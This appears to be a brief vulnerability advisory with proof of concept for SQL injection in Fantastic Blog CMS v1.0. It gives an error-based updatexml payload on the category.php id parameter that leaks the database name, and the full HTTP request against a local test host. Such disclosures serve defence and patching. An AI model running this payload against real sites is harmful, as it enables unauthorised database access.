# Fantastic Blog Cms v1.0 by Ronald Ngoda has SQL injection

vendors: https://www.sourcecodester.com/php/12258/fantastic-blog-cms-php.html

Vulnerability File: /fantasticblog/category.php

Vulnerability location: /fantasticblog/category.php?id=, id

[+] Payload: /fantasticblog/category.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id

```sql
GET /fantasticblog/category.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/167525083-19af8714-21a6-4659-a905-d95db502f99f.png)
